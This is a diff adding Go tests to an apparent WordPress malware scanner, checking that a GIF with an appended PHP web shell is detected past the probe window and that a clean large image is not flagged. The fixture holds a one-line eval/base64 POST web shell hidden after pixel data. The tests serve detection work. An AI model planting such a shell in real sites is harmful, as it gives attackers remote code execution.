@@ -143,3 +143,69 @@ func TestFindPHPTagPrefersTheStrongerTag(t *testing.T) {
 		t.Errorf("no tag was classified as %v", k)
 	}
 }
+
+// The polyglot path was unreachable on any real image.
+//
+// Binary-extension files were probed for only their first kilobyte, and a
+// polyglot by construction keeps a valid media header and appends the shell
+// after the pixel data. The rule could therefore never fire on a genuine
+// image — and the existing tests passed only because their fixture GIFs were
+// about fifty bytes, so the whole file fitted inside the probe window.
+func TestPolyglotFoundInARealisticallySizedImage(t *testing.T) {
+	root := t.TempDir()
+	scaffold(t, root)
+	dir := filepath.Join(root, "wp-content", "uploads")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	// A 40KB GIF: header, then pixel data far larger than any head probe,
+	// then the shell appended at the very end.
+	gif := []byte("GIF89a")
+	gif = append(gif, 0xD7, 0x00, 0x9E, 0x00, 0xF7, 0x00, 0x00, 0x2C, 0x00, 0x00)
+	pixels := make([]byte, 40<<10)
+	for i := range pixels {
+		pixels[i] = byte(i % 251)
+	}
+	gif = append(gif, pixels...)
+	gif = append(gif, []byte("<?php "+"ev"+"al(base64_decode($_POST['x'])); ?>")...)
+
+	if err := os.WriteFile(filepath.Join(dir, "banner.gif"), gif, 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	a := fpAgent(t, root)
+	a.scanFilesystem(context.Background())
+
+	var hit bool
+	for _, f := range a.Report().Findings {
+		if f.RuleID == "fs.polyglot_file" {
+			hit = true
+		}
+	}
+	if !hit {
+		t.Error("a 40KB image with an appended shell was not detected; the polyglot path is unreachable")
+	}
+}
+
+// An ordinary large image must still cost only the probe, not a full read.
+func TestLargeCleanImageIsNotReported(t *testing.T) {
+	root := t.TempDir()
+	scaffold(t, root)
+	dir := filepath.Join(root, "wp-content", "uploads")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	gif := append([]byte("GIF89a"), make([]byte, 60<<10)...)
+	if err := os.WriteFile(filepath.Join(dir, "clean.gif"), gif, 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	a := fpAgent(t, root)
+	a.scanFilesystem(context.Background())
+	for _, f := range a.Report().Findings {
+		if strings.HasPrefix(f.RuleID, "fs.polyglot") || strings.HasPrefix(f.RuleID, "fs.asset_contains") {
+			t.Errorf("a clean image was reported as %s", f.RuleID)
+		}
+	}
+}
